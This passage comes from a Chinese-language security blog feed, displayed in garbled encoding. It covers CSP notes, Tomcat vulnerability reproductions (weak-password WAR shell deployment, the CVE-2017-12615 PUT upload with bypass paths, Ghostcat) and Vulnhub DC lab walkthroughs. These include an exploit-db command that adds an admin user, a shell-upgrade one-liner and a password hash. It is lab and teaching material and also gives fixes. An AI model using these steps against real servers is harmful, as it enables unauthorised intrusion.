function_">send</span>(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="CSTâ€“traceè¯·æ±‚"><a href="#CSTâ€“traceè¯·æ±‚" class="headerlink" title="CSTâ€“traceè¯·æ±‚"></a>CSTâ€“traceè¯·æ±‚</h3><p>TRACE æ–¹æ³•ä¼šè¿”å›åŸå§‹è¯·æ±‚æŠ¥æ–‡ï¼Œå…¶ä¸­å°±åŒ…å«äº†cookie</p><p><a href="https://www.cnblogs.com/gaopei/p/11380349.html">https://www.cnblogs.com/gaopei/p/11380349.html</a></p><h3 id="debugä¿¡æ¯æ³„æ¼"><a href="#debugä¿¡æ¯æ³„æ¼" class="headerlink" title="debugä¿¡æ¯æ³„æ¼"></a>debugä¿¡æ¯æ³„æ¼</h3><p>æ¯”å¦‚phpinfoï¼Œthinkphpæ¡†æ¶debugä¿¡æ¯ç­‰</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><p><a href="https://xz.aliyun.com/t/12370#toc-25">https://xz.aliyun.com/t/12370#toc-25</a></p><blockquote><p>CSPæŒ‡çš„æ˜¯Content Security Policyï¼Œå³å†…å®¹å®‰å…¨ç­–ç•¥ã€‚å®ƒæ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºä¿æŠ¤ç½‘ç«™å…å—è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSæ”»å‡»ï¼‰ã€æ•°æ®ç›—å–ç­‰Webæ”»å‡»çš„å½±å“ã€‚<br>CSPæŒ‡ä»¤å¯ä»¥åœ¨HTTPå“åº”å¤´ä¸­è®¾ç½®ï¼Œä¹Ÿå¯ä»¥åœ¨HTMLæ–‡æ¡£ä¸­ä½¿ç”¨metaæ ‡ç­¾è®¾ç½®ã€‚<br>é€šè¿‡CSPï¼Œç½‘ç«™ç®¡ç†å‘˜å¯ä»¥å‘Šè¯‰æµè§ˆå™¨å“ªäº›èµ„æºå¯ä»¥åŠ è½½åˆ°é¡µé¢ä¸­ï¼Œä¾‹å¦‚å¯ä»¥ä¿¡ä»»å“ªäº›æ¥æºçš„JavaScriptã€CSSã€å›¾ç‰‡ç­‰èµ„æºã€‚è¿™æ ·ï¼Œæµè§ˆå™¨å°±åªä¼šåŠ è½½æ¥è‡ªè¿™äº›å—ä¿¡ä»»æ¥æºçš„èµ„æºï¼Œä»è€Œå‡å°‘äº†è¢«æ¶æ„è„šæœ¬æ”»å‡»çš„é£é™©ã€‚</p></blockquote><p><img src="/../images/image-20230512151453267-1686840019399.png" alt="image-20230512151453267"></p><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li>CSP</li><li>htmlå®ä½“ç¼–ç </li><li>é»‘åå•</li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tomcatæ¼æ´</title>
      <link href="/2023/06/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/"/>
      <url>/2023/06/01/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E4%B9%8BTomcat/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>vulhub</p><h2 id="Tomatäº†è§£"><a href="#Tomatäº†è§£" class="headerlink" title="Tomatäº†è§£"></a>Tomatäº†è§£</h2><h3 id="ç›®å½•ç»“æ„"><a href="#ç›®å½•ç»“æ„" class="headerlink" title="ç›®å½•ç»“æ„"></a>ç›®å½•ç»“æ„</h3><p><img src="/../images/image-20230228234754791-1686995572132.png" alt="image-20230228234754791"></p><p>webapps</p><p><img src="/../images/image-20230617184342638.png" alt="image-20230617184342638"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. binç›®å½•: å­˜æ”¾ä¸€äº›äºŒè¿›åˆ¶çš„æ–‡ä»¶ï¼Œä¾‹å¦‚Tomcatå¸¸ç”¨çš„ å¯åŠ¨è„šæœ¬: startup.batæˆ–startup.sh å…³é—­è„šæœ¬: shutdown.bat æˆ– shutdown.shç­‰ç­‰</span><br><span class="line"></span><br><span class="line">2. confç›®å½•: å­˜æ”¾çš„æ˜¯Tomcatçš„é…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">server.xmlï¼šå¯ä»¥è®¾ç½®ç«¯å£å·ã€è®¾ç½®åŸŸåæˆ–IPã€é»˜è®¤åŠ è½½çš„é¡¹ç›®ã€è¯·æ±‚ç¼–ç </span><br><span class="line">web.xmlï¼šéƒ¨ç½²æè¿°æ–‡ä»¶ï¼Œè¿™ä¸ªweb.xmlä¸­æè¿°äº†ä¸€äº›é»˜è®¤çš„servletï¼Œéƒ¨ç½²æ¯ä¸ªwebappæ—¶ï¼Œéƒ½ä¼šè°ƒç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œé…ç½®è¯¥webåº”ç”¨çš„é»˜è®¤servlet</span><br><span class="line">context.xmlï¼šå¯ä»¥ç”¨æ¥é…ç½®æ•°æ®æºä¹‹ç±»çš„</span><br><span class="line">tomcat-users.xmlï¼šç”¨æ¥é…ç½®ç®¡ç†tomcatçš„ç”¨æˆ·ä¸æƒé™</span><br><span class="line">Catalina:å¯ä»¥è®¾ç½®é»˜è®¤åŠ è½½çš„é¡¹ç›®</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3. libç›®å½•: å­˜æ”¾çš„æ˜¯å…¨å±€çš„jaråŒ…</span><br><span class="line"></span><br><span class="line">4. logsç›®å½•: å­˜æ”¾çš„æ˜¯Tomcatçš„æ—¥å¿—ï¼Œå¦‚æœTomcatå‡ºé”™ä»€ä¹ˆçš„ï¼Œå°±éœ€è¦åœ¨è¿™é‡Œçš„æ—¥å¿—ä¸­æŸ¥æ‰¾é—®é¢˜</span><br><span class="line"></span><br><span class="line">5. tempç›®å½•: å­˜æ”¾çš„æ˜¯ä¸´æ—¶æ€§çš„æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">6. webappsç›®å½•: å­˜æ”¾çš„æ˜¯Javaçš„Webé¡¹ç›®ï¼Œè¦éƒ¨ç½²çš„é¡¹ç›®å°±éœ€è¦æ”¾åœ¨è¿™ä¸ªç›®å½•å½“ä¸­</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7. workç›®å½•: å­˜æ”¾çš„æ˜¯ç”±JSPä»£ç ç¿»è¯‘çš„Javaä»£ç ï¼Œä»¥åŠç¼–è¯‘çš„.classæ–‡ä»¶</span><br></pre></td></tr></table></figure><h2 id="fofaè¯­æ³•"><a href="#fofaè¯­æ³•" class="headerlink" title="fofaè¯­æ³•"></a>fofaè¯­æ³•</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">title=&quot;Apache Tomcat&quot;</span><br><span class="line">server=&quot;Tomcat&quot; </span><br><span class="line"></span><br><span class="line">ç‰ˆæœ¬å·ï¼šåœ¨Tomcatåé¢æ·»åŠ /x.x</span><br></pre></td></tr></table></figure><h2 id="Tomcatæ¼æ´"><a href="#Tomcatæ¼æ´" class="headerlink" title="Tomcatæ¼æ´"></a>Tomcatæ¼æ´</h2><h3 id="managerå¼±å£ä»¤-éƒ¨ç½²waråŒ…getshell"><a href="#managerå¼±å£ä»¤-éƒ¨ç½²waråŒ…getshell" class="headerlink" title="managerå¼±å£ä»¤+éƒ¨ç½²waråŒ…getshell"></a>managerå¼±å£ä»¤+éƒ¨ç½²waråŒ…getshell</h3><h4 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p>Tomcat7+æˆ–è€…é…ç½®é”™è¯¯</p><h4 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><blockquote><p>conf&#x2F;tomcat-users.xmlä¸­ä¿å­˜äº†ç™»å½•å‡­è¯ï¼Œå¯¼è‡´å¯èƒ½å­˜åœ¨å¼±å£ä»¤æ¼æ´ï¼Œä»è€Œèƒ½è®¿é—®Manager APPä¸Šä¼ åé—¨ã€‚</p></blockquote><p><img src="/../images/image-20230228232924268-1686995572133.png" alt="image-20230228232924268"></p><p>è¿›å…¥managerç•Œé¢åå¯ä»¥éƒ¨ç½²waråŒ…</p><p>â€‹<img src="/../images/image-20230228232939975-1686995572134.png" alt="image-20230228232939975"></p><blockquote><p>waråŒ…ä¸ºjspå‹ç¼©æ–‡ä»¶ï¼ˆ<code>jar cvf xxx.jsp</code>ï¼‰ï¼ŒTomcatä¼šè‡ªåŠ¨è§£å‹ï¼Œ</p><p>å¦‚å°†shell.jspæ‰“åŒ…ä¸ºshell.warï¼ŒTomcatä¼šå°†å…¶è§£å‹ä¸º&#x2F;shell&#x2F;shell.jsp</p></blockquote><p><img src="/../images/image-20230228233506559-1686995572134.png" alt="image-20230228233506559"></p><h4 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h4><p>åˆ é™¤manageç›®å½•æˆ–è€…ä¿®æ”¹conf&#x2F;tomcat-users.xmlä¸­çš„ç”¨æˆ·å‡­è¯</p><h3 id="PUTä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰"><a href="#PUTä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰" class="headerlink" title="PUTä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰"></a>PUTä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼ˆCVE-2017-12615ï¼‰</h3><h4 id="å½±å“ç‰ˆæœ¬-1"><a href="#å½±å“ç‰ˆæœ¬-1" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p>7.0.0 &lt;&#x3D; tomcat &lt;&#x3D;7.0.79æˆ–è€…é…ç½®é”™è¯¯</p><h4 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><p>conf&#x2F;web.xmlæ–‡ä»¶é…ç½®äº†readonly&#x3D;falseï¼Œå¯¼è‡´å¯ä»¥å†™æ–‡ä»¶</p><p><img src="/../images/image-20230625214424587.png" alt="image-20230625214424587"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/1.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.174.129:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>693</span><br><span class="line"></span><br><span class="line"><span class="language-dockerfile"><span class="keyword">shell</span></span></span><br></pre></td></tr></table></figure><blockquote><p><strong>éœ€è¦è¿›è¡Œç»•è¿‡</strong></p><p>Windowsï¼š<br>1ã€åˆ©ç”¨&#x2F;shell.jsp::$DATAçš„æ–¹å¼ç»•è¿‡<br>2ã€&#x2F;shell.jsp%20ï¼Œç©ºæ ¼ç»•è¿‡<br>3ã€&#x2F;shell.jsp&#x2F; ï¼Œ Tomcatåœ¨å¤„ç†æ–‡ä»¶æ—¶ä¼šåˆ é™¤æœ€åçš„&#x2F;<br>Linuxï¼š<br>1ã€&#x2F;shell.jsp&#x2F; ï¼Œ Tomcatåœ¨å¤„ç†æ–‡ä»¶æ—¶ä¼šåˆ é™¤æœ€åçš„&#x2F;</p></blockquote><p><img src="/../images/2676572-20220223152639690-1145929483.png" alt="img"></p><p>è¿”å›201è¡¨ç¤ºä¸Šä¼ æˆåŠŸ</p><h4 id="ä¿®å¤æ–¹æ¡ˆ-1"><a href="#ä¿®å¤æ–¹æ¡ˆ-1" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h4><p>conf&#x2F;web.xmlæ–‡ä»¶é…ç½®readonlyå€¼ä¸ºTrueæˆ–æ³¨é‡Šè¯¥å‚æ•°</p><h3 id="AJPæ–‡ä»¶åŒ…å«-x2F-è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰"><a href="#AJPæ–‡ä»¶åŒ…å«-x2F-è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰" class="headerlink" title="AJPæ–‡ä»¶åŒ…å«&#x2F;è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰"></a>AJPæ–‡ä»¶åŒ…å«&#x2F;è¯»å–â€“Ghostcatå¹½çµçŒ«ï¼ˆCVE-2020-1938ï¼‰</h3><h4 id="å½±å“ç‰ˆæœ¬-2"><a href="#å½±å“ç‰ˆæœ¬-2" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h4><p><img src="/../images/image-20230617182333230.png" alt="image-20230617182333230"></p><h4 id="æ¼æ´å±å®³"><a href="#æ¼æ´å±å®³" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h4><p><img src="/../images/image-20230913153055256.png" alt="image-20230913153055256"></p><h4 id="å¤ç°-2"><a href="#å¤ç°-2" class="headerlink" title="å¤ç°"></a>å¤ç°</h4><p><strong>python2è¿è¡Œ</strong></p><p><strong>å¯ä»¥è¯»å–æˆ–åŒ…å« Tomcat ä¸Šæ‰€æœ‰ webapp ç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶</strong></p><p><img src="/../images/image-20230617184142564.png" alt="image-20230617184142564"></p><p><img src="/../images/image-20230617184129890.png" alt="image-20230617184129890"></p><h4 id="æ¼æ´æ£€æµ‹ä¸ä¿®å¤"><a href="#æ¼æ´æ£€æµ‹ä¸ä¿®å¤" class="headerlink" title="æ¼æ´æ£€æµ‹ä¸ä¿®å¤"></a>æ¼æ´æ£€æµ‹ä¸ä¿®å¤</h4><p><a href="https://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/#2-2-%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">CVE-2020-1938:Tomcat AJPåè®®æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ | å›å¿†é£˜å¦‚é›ª (gv7.me)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub--DCç³»åˆ—</title>
      <link href="/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/"/>
      <url>/2023/06/01/Vulnhub-DC%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><h4 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo netdiscover 192.168.174.0/24</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223133100570-1686283446321.png" alt="image-20230223133100570"></p><p><img src="/../images/image-20230223133203500-1686283446321.png" alt="image-20230223133203500"></p><h4 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p><img src="/../images/image-20230223131655833-1686283446321.png" alt="image-20230223131655833"></p><h4 id="æŸ¥çœ‹ç½‘ç«™"><a href="#æŸ¥çœ‹ç½‘ç«™" class="headerlink" title="æŸ¥çœ‹ç½‘ç«™"></a>æŸ¥çœ‹ç½‘ç«™</h4><p><img src="/../images/image-20230223133357605-1686283446321.png" alt="image-20230223133357605"></p><p>åªæœ‰æ³¨å†Œï¼Œç™»å½•ï¼Œæ‰¾å›å¯†ç åŠŸèƒ½ï¼ˆè¿™é‡Œç”¨sqlmapæ²¡æœ‰æˆåŠŸï¼‰</p><p>å¾ˆå®¹æ˜“çŸ¥é“å…¶æ˜¯Drupalç³»ç»Ÿã€‚</p><h4 id="å¯»æ‰¾æ¼æ´"><a href="#å¯»æ‰¾æ¼æ´" class="headerlink" title="å¯»æ‰¾æ¼æ´"></a>å¯»æ‰¾æ¼æ´</h4><p><img src="/../images/image-20230223133730288-1686283446321.png" alt="image-20230223133730288"></p><p>è¿™é‡Œä¼˜å…ˆä½¿ç”¨æ—¥æœŸè¾ƒæ–°ï¼Œç­‰çº§ä¸ºä¼˜ç§€çš„expï¼ˆä¹Ÿå¯ä»¥é€šè¿‡æ”¶é›†åˆ°çš„ç³»ç»Ÿç‰ˆæœ¬å¯»æ‰¾æ—¥æœŸï¼‰</p><p><img src="/../images/image-20230223133945118-1686283446321.png" alt="image-20230223133945118"></p><p>å‘ç°æˆåŠŸäº†ã€‚</p><h4 id="è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†"><a href="#è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†"></a>è·å¾—shellåçš„ä¿¡æ¯æ”¶é›†</h4><p><img src="/../images/image-20230223134100934-1686283446322.png" alt="image-20230223134100934"></p><p>ç½‘ä¸ŠæŸ¥æ‰¾å¯çŸ¥Drupalçš„é…ç½®æ–‡ä»¶åœ¨<code> /sites/default/settings.php</code>,è¯»å–åå¾—åˆ°flag2å’Œæ•°æ®åº“é…ç½®ä¿¡æ¯</p><p><img src="/../images/1962254-20200713224317160-859515027-1686283446322.png" alt="img"></p><p>è¿æ¥æ•°æ®åº“ï¼Œéœ€è¦å…ˆå°†shellåˆ‡æ¢ä¸ºäº¤äº’å¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223134424820-1686283446322.png" alt="image-20230223134424820"></p><p>è¿æ¥åï¼ŒæŸ¥è¯¢ç”¨æˆ·è¡¨æ”¶é›†ç®¡ç†å‘˜è´¦æˆ·ä¿¡æ¯ã€‚</p><p><img src="/../images/image-20230223130117676-1686283446322.png" alt="image-20230223130117676"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œadminçš„å¯†ç æ˜¯åŠ å¯†äº†çš„ã€‚è¿™é‡Œæœ‰ä¸‰ç§æ€è·¯</p><ul><li><p>æš´åŠ›ç ´è§£</p><blockquote><p>ä½¿ç”¨johnå¤±è´¥äº†ã€‚</p></blockquote><p><img src="/../images/image-20230223135625792-1686283446323.png" alt="image-20230223135625792"></p></li><li><p>ä¿®æ”¹å¯†ç </p><blockquote><p>éœ€è¦æ‰¾åˆ°å¯¹åº”çš„åŠ å¯†è„šæœ¬ã€‚</p></blockquote><p><img src="/../images/image-20230223135430041-1686283446323.png" alt="image-20230223135430041"></p><p><img src="/../images/image-20230223130607081-1686283446323.png" alt="image-20230223130607081"></p><p><img src="/../images/image-20230223131033472-1686283446323.png" alt="image-20230223131033472"></p></li><li><p>å¢åŠ ä¸€åç”¨æˆ·ï¼ˆç®¡ç†å‘˜æƒé™ï¼‰</p><p>ä½¿ç”¨<a href="https://blog.csdn.net/whatday/article/details/102806149">SearchSploit</a>æŸ¥æ‰¾æ˜¯å¦æœ‰å¯¹åº”çš„è„šæœ¬</p><p><img src="/../images/image-20230223142047059-1686283446323.png" alt="image-20230223142047059"></p><p><img src="/../images/image-20230223142453365-1686283446323.png" alt="image-20230223142453365"></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python2  /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.174.142/ -u admin1 -p 12345</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223142640254-1686283446323.png" alt="image-20230223142640254"></p><p><img src="/../images/image-20230223142651974-1686283446323.png" alt="image-20230223142651974"></p></li></ul><h3 id="ç™»å½•å"><a href="#ç™»å½•å" class="headerlink" title="ç™»å½•å"></a>ç™»å½•å</h3><p><img src="/../images/image-20230223131339443-1686283446323.png" alt="image-20230223131339443"></p><p><img src="/../images/image-20230223131415615-1686283446323.png" alt="image-20230223131415615"></p><p><img src="/../images/image-20230223131557531-1686283446323.png" alt="image-20230223131557531"></p><p><img src="/../images/image-20230223131846299-1686283446324.png" alt="image-20230223131846299"></p><p>å°è¯•ææƒ</p><p><img src="/../images/image-20230223131936343-1686283446324.png" alt="image-20230223131936343"></p><p><img src="/../images/image-20230223131903800-1686283446324.png" alt="image-20230223131903800"></p><p><img src="/../images/image-20230223131922331-1686283446324.png" alt="image-20230223131922331"></p><p><img src="/../images/image-20230223132056437-1686283446324.png" alt="image-20230223132056437"></p><p><img src="/../images/image-20230223132116100-1686283446324.png" alt="image-20230223132116100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230223132610089-1686283446324.png" alt="image-20230223132610089"></p><p>ç ´è§£æˆåŠŸåç™»å½•flag4ç”¨æˆ·</p><p><img src="/../images/image-20230223132741851-1686283446324.png" alt="image-20230223132741851"></p><p><img src="/../images/image-20230223132857455-1686283446324.png" alt="image-20230223132857455"></p><p>ä»ç„¶ä½¿ç”¨ä¸Šé¢çš„findææƒ</p><p><img src="/../images/image-20230223132915683-1686283446324.png" alt="image-20230223132915683"></p><h2 id="DC2"><a href="#DC2" class="headerlink" title="DC2"></a>DC2</h2><p><a href="https://cloud.tencent.com/developer/article/1801074">https://cloud.tencent.com/developer/article/1801074</a></p><ul><li>ipé‡å®šå‘ï¼Œéœ€è¦æ·»åŠ hostè®°å½•</li><li>cewlå¯†ç å­—å…¸ç”Ÿæˆï¼Œå¯†ç çˆ†ç ´</li><li>7744ç«¯å£çš„sshçˆ†ç ´</li><li>rbashé™åˆ¶</li><li>gitææƒ</li></ul><h2 id="DC3"><a href="#DC3" class="headerlink" title="DC3"></a>DC3</h2><p><a href="https://blog.csdn.net/bwt_D/article/details/121291921">https://blog.csdn.net/bwt_D/article/details/121291921</a></p><ul><li>ä¿¡æ¯æ”¶é›†ï¼šå¾—åˆ°ç½‘ç«™CMSï¼Œä½¿ç”¨å¯¹åº”ç‰ˆæœ¬æ¼æ´expçˆ†åº“</li><li>johnå¯†ç å“ˆå¸Œçˆ†ç ´</li><li>åå°ä»»æ„æ–‡ä»¶ä¸Šä¼ </li><li>å†…æ ¸ææƒ</li></ul><h2 id="DC4"><a href="#DC4" class="headerlink" title="DC4"></a>DC4</h2><p><a href="https://blog.csdn.net/weixin_44288604/article/details/108018008">https://blog.csdn.net/weixin_44288604/article/details/108018008</a></p><ul><li>ç”¨æˆ·ç™»å½•æ— é˜²æŠ¤çˆ†ç ´</li><li>rce</li><li>sshçˆ†ç ´</li><li>ä¿¡æ¯æ”¶é›†ï¼šå¤‡ä»½æ–‡ä»¶ï¼Œé‚®ä»¶ï¼ˆæ³„éœ²ç”¨æˆ·å¯†ç ï¼‰</li><li>teeheeææƒ</li></ul><p><img src="/../images/image-20230224161511140-1686283446324.png" alt="image-20230224161511140"></p><h2 id="DC5"><a href="#DC5" class="headerlink" title="DC5"></a>DC5</h2><p><a href="https://www.freebuf.com/sectool/259277.html">https://www.freebuf.com/sectool/259277.html</a></p><ul><li>æ—¥å¿—åŒ…å«getshell</li><li>screenææƒ</li></ul><p>ç«¯å£æ‰«æ</p><img src="../../../typora img/image-20230224202703382.png" alt="image-20230224202703382" style="zoom: 80%;" /><p>é€šè¿‡contactæäº¤åï¼Œé¡µé¢è¿”å›çš„é¡µè„šä¸åŒåˆ¤æ–­å‡ºåç«¯æœ‰includeå‡½æ•°åŒ…å«äº†é¡µè„šæ–‡ä»¶ã€‚</p><p><img src="/../images/image-20230224204544733-1686283446324.png" alt="image-20230224204544733"></p><p><img src="/../images/image-20230224204559624-1686283446325.png" alt="image-20230224204559624"></p><p>ä½¿ç”¨burpçˆ†ç ´å‚æ•°</p><p><img src="/../images/image-20230224204633133-1686283446325.png" alt="image-20230224204633133"></p><img src="../../../typora img/image-20230224204657204.png" alt="image-20230224204657204" style="zoom:80%;" /><p>æ–‡ä»¶åŒ…å«getshell</p><p>å› ä¸ºç½‘ç«™æ²¡æœ‰æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ‰€ä»¥å¯ä»¥è€ƒè™‘åŒ…å«æ—¥å¿—æ–‡ä»¶&#x2F;sessionæ–‡ä»¶ï¼Œæˆ–è€…ä¸phpinfoç•Œé¢è¿ç”¨ã€‚</p><p>è¿™é‡Œé€‰æ‹©åŒ…å«æ—¥å¿—æ–‡ä»¶</p><h2 id="DC6"><a href="#DC6" class="headerlink" title="DC6"></a>DC6</h2><p><a href="https://blog.csdn.net/weixin_45996361/article/details/123431118">https://blog.csdn.net/weixin_45996361/article/details/123431118</a></p><ul><li>ç”¨æˆ·å¯†ç çˆ†ç ´ï¼ˆå­—å…¸ä¸ºDC2çš„ï¼‰</li><li>wordpressæ’ä»¶activity monitoræä¾›äº†pingå‘½ä»¤ï¼Œå¯¹ç”¨æˆ·è¾“å…¥æ— é™åˆ¶å¯¼è‡´rce</li><li>é‚®ä»¶å¯†ç æ³„éœ²</li><li>sudoææƒ</li><li>nmapææƒ</li></ul><p><img src="/../images/image-20230225172831079-1686283446325.png" alt="image-20230225172831079"></p><p><img src="/../images/image-20230225202530004-1686283446325.png" alt="image-20230225202530004"></p><p><img src="/../images/image-20230225202604851-1686283446325.png" alt="image-20230225202604851"></p><p><img src="/../images/image-20230225202617319-1686283446325.png" alt="image-20230225202617319"></p><p><img src="/../images/image-20230225202517080-1686283446325.png" alt="image-20230225202517080"></p><p><img src="/../images/image-20230225202502557-1686283446325.png" alt="image-20230225202502557"></p><h2 id="DC7"><a href="#DC7" class="headerlink" title="DC7"></a>DC7</h2><ul><li><p>ç«¯å£ï¼š22,80</p></li><li><p>ä¿¡æ¯æ”¶é›†ï¼šgithubæºç æ³„éœ²</p><p><img src="/../images/image-20230225211326780-1686283446325.png" alt="image-20230225211326780"></p><img src="../../../typora img/image-20230225211258444.png" alt="image-20230225211258444" style="zoom:80%;" /><p><img src="/../images/image-20230225211553018-1686283446325.png" alt="image-20230225211553018"></p><p>è¿™ä¸ªè´¦æˆ·æµ‹è¯•åå¯ä»¥è¿æ¥ssh</p></li><li><p>sshè¿æ¥åä¿¡æ¯æ”¶é›†</p><p>æœ‰é‚®ä»¶</p><p><img src="/../images/image-20230225211951236-1686283446325.png" alt="image-20230225211951236"></p><p><img src="/../images/image-20230225211719078-1686283446326.png" alt="image-20230225211719078"></p><p>å‘ç°éƒ½æ˜¯ä»¥ä¸‹ä¿¡æ¯ï¼Œå¹¶ä¸”æ¯éš”ä¸€æ®µæ—¶é—´éƒ½æœ‰<code>You have new mail</code>æç¤ºï¼Œå¯ä»¥çŒœæµ‹å‡ºè¿™æ˜¯ä¸€ä¸ªå®šæ—¶è„šæœ¬</p><p><img src="/../images/image-20230225211729539-1686283446326.png" alt="image-20230225211729539"></p><p><img src="/../images/image-20230225211814513-1686283446326.png" alt="image-20230225211814513"></p><p>â€‹</p></li></ul><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ cat /opt/scripts/backups.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">rm /home/dc7user/backups/*</span><br><span class="line">cd /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line">chown dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line">rm /home/dc7user/backups/website.sql</span><br><span class="line">rm /home/dc7user/backups/website.tar.gz</span><br></pre></td></tr></table></figure><p>drushæ˜¯drupalçš„å‘½ä»¤ï¼Œå¯ä»¥ä¿®æ”¹adminå¯†ç  ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨ç½‘ç«™ç›®å½•ä¸‹æ‰å¯ä»¥</p><p>gpgæ˜¯å…¬é’¥åŠ å¯†ç®—æ³•ï¼Œæ²¡æ‰¾åˆ°å…¬é’¥ï¼Œæ‰€ä»¥æ— 